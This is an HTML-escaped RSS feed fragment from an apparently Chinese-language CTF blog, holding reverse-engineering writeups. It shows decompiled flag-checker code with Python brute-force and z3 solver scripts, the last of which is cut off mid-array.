      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_50c2[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; BYTE_ARRAY_5219[(byte)(bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
      bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_5234[bVar3];
      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; in_C;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;)(bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)) {
      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x01&amp;#39;&lt;/span&gt;;
    }
    bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    in_C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; bVar3;
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}


undefined &lt;span style=&#34;color:#a6e22e&#34;&gt;FUN_52e8&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
  byte bVar1;
  
  bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (BYTE_ARRAY_5200[bVar1] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; BYTE_ARRAY_5234[bVar1]) {
      FUN_531d();
      bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        BYTE_ARRAY_509a[bVar1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s__NICE_TRY,_MAYBE_NEXT_TIME_ITS_C_5276[bVar1];
        bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;);
  bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    BYTE_ARRAY_509a[bVar1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s__GOOD_JOB&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;_ENJOY_THOSE_REVERSING_524e[bVar1];
    bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过修改 &lt;code&gt;savestate.json&lt;/code&gt; 的PC位置（EIP）即可进行动调，发现输入被存入 &lt;code&gt;50c2&lt;/code&gt; 中，复现该函数并爆破即可得到flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCE&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCE&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbd&lt;/span&gt;
]


array_50c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB9&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;
]



array_5219 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9A&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCA&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;,
]


array_5234 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;)]


in_C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;


j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    in_C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;):
        array_50c2[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j
        var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
        
        var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; var1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array_50c2[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; array_50c2[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
            var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
            var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array_5234[i]
            array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((var1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ((array_50c2[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array_50c2[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; array_5219[i]
            var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array_5234[i]
            array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((var1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; in_C) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; var1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;


        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; array_5234[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; target[i]:
            print (chr(j), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>TSGCTF2021 and pbctf2021 RE writeups</title>
        <link>/post/tsgctf2021-and-pbctf2021-re-writeups/</link>
        <pubDate>Sat, 09 Oct 2021 22:22:33 +0000</pubDate>
        
        <guid>/post/tsgctf2021-and-pbctf2021-re-writeups/</guid>
        <description>&lt;img src="/post/tsgctf2021-and-pbctf2021-re-writeups/cover.jpg" alt="Featured image of post TSGCTF2021 and pbctf2021 RE writeups" /&gt;&lt;h2 id=&#34;tsgctf2021&#34;&gt;TSGCTF2021&lt;/h2&gt;
&lt;h3 id=&#34;beginners-rev&#34;&gt;Beginners Rev&lt;/h3&gt;
&lt;p&gt;用 &lt;code&gt;fork()&lt;/code&gt; 遍历了 32 位输入，每个输入都分别进行一次函数运算&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;fork() )
    {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v1 &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; v3;
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/null&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
      dup2(v7, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v3 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;每个函数运算都是将输入迭代好多次&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a2;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1217102449&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1217102449&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2927C&lt;/span&gt; )
  {
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v6;
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v6 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; )
    {
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
  }
  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;被retaddr坑了一会，后面才反应过来开头那个 &lt;code&gt;if ( retaddr - (_BYTE *)check != 95 )&lt;/code&gt; 的意思&lt;/p&gt;
&lt;p&gt;解法就是先将while循环内的运算解出来，然后用z3求解就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFB&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, 
